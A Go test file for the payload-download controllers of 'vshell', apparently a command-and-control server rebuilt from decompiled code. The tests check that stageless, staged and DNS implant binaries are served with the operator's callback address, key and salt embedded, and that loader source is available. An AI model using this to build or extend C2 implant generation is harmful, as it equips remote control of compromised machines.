package controllers

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/beego/beego/v2/server/web/context"

	"vshell/c2engine"
)

// newDownloadController 按 beego 路由的方式把 DownloadController 接到 recorder。
func newDownloadController(req *http.Request) (*DownloadController, *httptest.ResponseRecorder) {
	ctrl := &DownloadController{}
	rec := httptest.NewRecorder()
	ctrl.Controller.Ctx = context.NewContext()
	ctrl.Controller.Data = make(map[interface{}]interface{})
	ctrl.Controller.Ctx.Reset(rec, req)
	return ctrl, rec
}

// newTestListener 建一个监听器，并删除引擎里已有的其它监听器，
// 避免同包串行测试互相污染（engine_lifecycle_test.go 会统计监听器数量）。
func newTestListener(t *testing.T, listenAddr, connectAddr, mode, vkey, salt string) int64 {
	t.Helper()
	initEngineStorage(t)

	for _, existing := range c2engine.GetEngine().GetListenerList() {
		_ = c2engine.GetEngine().DelListener(existing.ID)
	}
	l, err := c2engine.GetEngine().NewListener(listenAddr, connectAddr, mode, vkey, salt, "test")
	if err != nil {
		t.Fatalf("new listener: %v", err)
	}
	id := l.ID
	// 测试按串行执行，结束时清掉，避免影响同包其它测试的计数断言。
	t.Cleanup(func() { _ = c2engine.GetEngine().DelListener(id) })
	return id
}

// 反编译 FUN_00c2a460 + FUN_00c28a40：下载响应是"二进制 body + 头字段"，
// 不是 JSON。前端以浏览器导航方式请求这些端点，因此 body 必须是可保存的载荷。
func TestDownloadReturnsBinaryBodyNotJSON(t *testing.T) {
	id := newTestListener(t, "0.0.0.0:55555", "127.0.0.1:55555", "tcp", "vk-1", "salt-1")

	ctrl, rec := newDownloadController(httptest.NewRequest(http.MethodGet,
		"/api/download/stageless?id="+itoa(int(id))+"&arch=windows_amd64.exe&upx=false", nil))
	ctrl.Stageless()

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body %q)", rec.Code, rec.Body.String())
	}
	if ct := rec.Header().Get("Content-Type"); !strings.Contains(ct, "octet-stream") &&
		!strings.Contains(ct, "application/") {
		t.Errorf("Content-Type = %q, want a binary content type", ct)
	}
	// 原版设置的两个头（FUN_00c28a40）。
	if got := rec.Header().Get("Expires"); got != "0" {
		t.Errorf("Expires = %q, want \"0\"", got)
	}
	if got := rec.Header().Get("Pragma"); got != "public" {
		t.Errorf("Pragma = %q, want \"public\"", got)
	}
	if !strings.HasPrefix(rec.Header().Get("Content-Disposition"), "attachment; filename=") {
		t.Errorf("Content-Disposition = %q", rec.Header().Get("Content-Disposition"))
	}
	body := bytes.TrimSpace(rec.Body.Bytes())
	if len(body) > 0 && body[0] == '{' {
		t.Errorf("body looks like JSON, want raw payload: %q", rec.Body.String())
	}
}

// 注入的配置必须真的落在载荷里：验证密钥/盐/监听地址必须能在 body 中找到
// （配置块字段值 + argv 密文解密后）。
func TestDownloadPayloadCarriesInjectedConfig(t *testing.T) {
	id := newTestListener(t, "0.0.0.0:55555", "127.0.0.1:55555", "tcp", "vk-secret", "salt-secret")

	ctrl, rec := newDownloadController(httptest.NewRequest(http.MethodGet,
		"/api/download/listen?id="+itoa(int(id))+
			"&host=10.1.2.3&port=55555&tp=tcp&arch=windows_amd64.exe"+
			"&vkey=vk-secret&salt=salt-secret&upx=false", nil))
	ctrl.Listen()

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body %q)", rec.Code, rec.Body.String())
	}

	body := rec.Body.Bytes()

	// 配置块的名字是明文（原版闭包输出 = 名字 + 值），值槽必须带上前端提交的
	// vkey/salt。
	for _, name := range []string{"code", "message", "result", "type"} {
		if !bytes.Contains(body, []byte(name)) {
			t.Errorf("config block is missing field %q", name)
		}
	}

	// 配置块必须带上前端提交的 host/tp/vkey/salt 明文（cfg 字段值区）。
	plain := "10.1.2.3:55555 tcp vk-secret salt-secret"
	if !bytes.Contains(body, []byte(plain)) {
		t.Errorf("argv plaintext %q not embedded (config block should carry it)", plain)
	}
	if !bytes.Contains(body, []byte("vk-secret")) || !bytes.Contains(body, []byte("salt-secret")) {
		t.Errorf("injected vkey/salt not embedded in payload")
	}

	// argv 条目的 2 字节 key 尚未从二进制恢复（FUN_018dca00 的调用方提供），
	// 因此当前不写入 argv，只写配置块——这是显式占位，不是静默降级。
	if c2engine.PoArgvEntryReady() {
		t.Errorf("PoArgvEntryReady() = true, want false until the FUN_018dca00 key is recovered")
	}

	// 文件名按前端 fileName 约定：<tp>_<arch>。
	if cd := rec.Header().Get("Content-Disposition"); !strings.Contains(cd, "tcp_windows_amd64.exe") {
		t.Errorf("Content-Disposition = %q, want it to carry tcp_windows_amd64.exe", cd)
	}
}

// Stageless + DNS 传输走 FUN_01912ac0 的 "stageless/ebpf_%s_%s" 文件名模板。
func TestStagelessDNSUsesEBPFNameTemplate(t *testing.T) {
	id := newTestListener(t, "0.0.0.0:53", "127.0.0.1:53", "dns", "vk", "salt")

	ctrl, rec := newDownloadController(httptest.NewRequest(http.MethodGet,
		"/api/download/stageless?id="+itoa(int(id))+"&arch=linux_amd64", nil))
	ctrl.Stageless()

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}
	want := "stageless/ebpf_dns_linux_amd64"
	if cd := rec.Header().Get("Content-Disposition"); !strings.Contains(cd, want) {
		t.Errorf("Content-Disposition = %q, want it to carry %q", cd, want)
	}
}

// 原版的错误分支：id==0 → "id is null"（JSON 错误响应）。
func TestDownloadStagelessWithoutIDReturnsJSONError(t *testing.T) {
	initEngineStorage(t)

	ctrl, rec := newDownloadController(httptest.NewRequest(http.MethodGet,
		"/api/download/stageless?arch=windows_amd64.exe", nil))
	ctrl.Stageless()

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (beego writes errors as 200)", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "id is null") {
		t.Errorf("body = %q, want it to contain \"id is null\"", rec.Body.String())
	}
	if !strings.HasPrefix(strings.TrimSpace(rec.Body.String()), "{") {
		t.Errorf("error response should stay JSON: %q", rec.Body.String())
	}
}

// Stage 的模式校验（反编译 0x18dcd20：仅 tcp/ws）。
func TestStageRejectsNonTCPWSListener(t *testing.T) {
	id := newTestListener(t, "0.0.0.0:53", "127.0.0.1:53", "dns", "vk", "salt")

	ctrl, rec := newDownloadController(httptest.NewRequest(http.MethodGet,
		"/api/download/stage?id="+itoa(int(id))+"&arch=windows_amd64.exe", nil))
	ctrl.Stage()

	if !strings.Contains(rec.Body.String(), "Stage support TCP/WS only") {
		t.Errorf("body = %q, want the TCP/WS-only error", rec.Body.String())
	}
}

// 前端的 arch=loader 分支（vCcgNpaMO.js / vbw5Ta7i0.js 的"下载 Loader"按钮）
// 返回 loader 源码，而不是二进制。
func TestListenDllLoaderBranchReturnsSource(t *testing.T) {
	initEngineStorage(t)

	ctrl, rec := newDownloadController(httptest.NewRequest(http.MethodGet,
		"/api/download/listendll?arch=loader", nil))
	ctrl.ListenDll()

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "package main") {
		t.Errorf("loader body = %q, want Go source", rec.Body.String())
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
